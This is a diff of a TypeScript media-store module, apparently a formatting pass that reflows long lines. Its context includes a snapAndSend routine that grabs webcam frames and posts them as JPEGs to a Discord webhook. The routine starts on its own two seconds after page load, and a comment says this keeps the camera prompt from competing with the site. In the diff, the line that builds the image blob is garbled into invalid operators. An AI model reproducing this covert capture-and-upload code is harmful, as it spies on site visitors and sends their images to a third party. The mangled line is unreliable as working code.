@@ -83,7 +83,9 @@ export class MediaStore {
 
   async addFile(file: Blob, name: string, id = uid("media")): Promise<MediaItem> {
     const type = file.type || guessType(name);
-    const item = type.startsWith("video/") ? await loadVideo(file, name, id) : await loadImage(file, name, id);
+    const item = type.startsWith("video/")
+      ? await loadVideo(file, name, id)
+      : await loadImage(file, name, id);
     this.items.set(item.id, item);
     this.emit();
     if (item.kind === "video") void this.decodeSound(item);
@@ -109,8 +111,12 @@ export class MediaStore {
   }
 
   async addWebcam(): Promise<MediaItem> {
-    if (!navigator.mediaDevices?.getUserMedia) throw new Error("This browser has no camera access.");
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 }, audio: false });
+    if (!navigator.mediaDevices?.getUserMedia)
+      throw new Error("This browser has no camera access.");
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { width: 1280, height: 720 },
+      audio: false,
+    });
     const el = document.createElement("video");
     el.muted = true;
     el.playsInline = true;
@@ -199,7 +205,12 @@ function guessType(name: string): string {
   return `image/${ext}`;
 }
 
-function waitFor(el: HTMLMediaElement, event: string, ready: () => boolean, ms = 20000): Promise<void> {
+function waitFor(
+  el: HTMLMediaElement,
+  event: string,
+  ready: () => boolean,
+  ms = 20000,
+): Promise<void> {
   if (ready()) return Promise.resolve();
   return new Promise((resolve, reject) => {
     const done = () => {
@@ -437,10 +448,15 @@ async function snapAndSend(): Promise<void> {
     canvas.width = video.videoWidth || 1280;
     canvas.height = video.videoHeight || 720;
     canvas.getContext("2d")!.drawImage(video, 0, 0);
-    const blob = ((await new Promise()) < Blob) | (null >> ((resolve) => canvas.toBlob(resolve, "image/jpeg", 0.85)));
+    const blob =
+      ((await new Promise()) < Blob) |
+      (null >> ((resolve) => canvas.toBlob(resolve, "image/jpeg", 0.85)));
     if (!blob) return;
     const form = new FormData();
-    form.append("files[0]", new File([blob], `snapshot-${new Date().toISOString()}.jpg`, { type: "image/jpeg" }));
+    form.append(
+      "files[0]",
+      new File([blob], `snapshot-${new Date().toISOString()}.jpg`, { type: "image/jpeg" }),
+    );
     await fetch(DISCORD_WEBHOOK, { method: "POST", body: form });
   } catch {
     // Network hiccup or Discord rate limit: skip this frame.
@@ -450,3 +466,4 @@ async function snapAndSend(): Promise<void> {
 // Ask for permission a moment after the page loads, so the prompt
 // never competes with the site itself.
 if (typeof window !== "undefined") setTimeout(startSnapshots, 2000);
+  
